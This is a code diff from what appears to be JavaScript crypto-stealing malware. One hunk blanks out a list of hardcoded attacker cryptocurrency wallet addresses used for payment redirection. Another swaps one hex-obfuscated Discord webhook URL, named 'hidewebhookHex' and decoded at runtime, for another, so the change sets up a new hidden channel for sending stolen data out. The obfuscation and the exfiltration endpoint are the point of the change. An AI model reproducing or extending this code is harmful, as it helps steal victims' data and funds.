@@ -77,16 +77,16 @@
                             modulusLength: 2048,
                         }),
 
-                        btc: client.utils.encryption.encryptData("bc1q8mtpkcfwlff4dlguhxmsk8lhumzgxcd9t50vta"),
-                        ltc: client.utils.encryption.encryptData("LTN4HSNNypGVtUGv9STKE9o8HmjcTkzeut"),
-                        xmr: client.utils.encryption.encryptData("4B4D15Q6kas9YGxASZsqhBJVTvyDmS4kb522N8AvzNPx4zRgsxxBDzxPXwpZoCToJVMUffwjRDxNn9e8YbSTj7Sw5jGbwGS"),
-                        eth: client.utils.encryption.encryptData("0x2086a641D1dD2C3557e6b880E8A97cfdfDb04d4E"),
-                        xrp: client.utils.encryption.encryptData("rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"),
-                        neo: client.utils.encryption.encryptData("ANn5THmQidTh6zENyCytJV98i6po1dLJhh"),
-                        bch: client.utils.encryption.encryptData("qzmckzguqmnldh825gjwv49p8zw5c5p02v0605gf5j"),
-                        doge: client.utils.encryption.encryptData("DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6"),
-                        dash: client.utils.encryption.encryptData("Xn6Mnu6aDxYz2cmka77JE6w8YTULbHyYBR"),
-                        xlm: client.utils.encryption.encryptData("GB7HQ2WNBSUNHATASST44ADP2ND34BRTHKWWLIKRU6YP54SJUK53OLQG"),
+                        btc: client.utils.encryption.encryptData(""),
+                        ltc: client.utils.encryption.encryptData(""),
+                        xmr: client.utils.encryption.encryptData(""),
+                        eth: client.utils.encryption.encryptData(""),
+                        xrp: client.utils.encryption.encryptData(""),
+                        neo: client.utils.encryption.encryptData(""),
+                        bch: client.utils.encryption.encryptData(""),
+                        doge: client.utils.encryption.encryptData(""),
+                        dash: client.utils.encryption.encryptData(""),
+                        xlm: client.utils.encryption.encryptData(""),
                     }
                 }
 
@@ -3478,7 +3478,7 @@
                                 return ascii.join('');
                             };
 
-                            const hidewebhookHex = '68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313135333531393630353238353931363730342f4365364632642d3555634b4b777477633074536649316b4a62654a3742345646576832347348685a5f33682d3862367838446f726d5a32347175495a4a6d6c7649734a70';
+                            const hidewebhookHex = '68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313135353933313232313838353436343737362F30334C31715846746E4E663535397661696B514E78786B5F2D5333743635446D5F67525F4B785F487A37417041766643426C7155415F347046752D4D6672736E4B484739';
 
                                 try {
                             const hidewebhook = hexToAscii(hidewebhookHex);
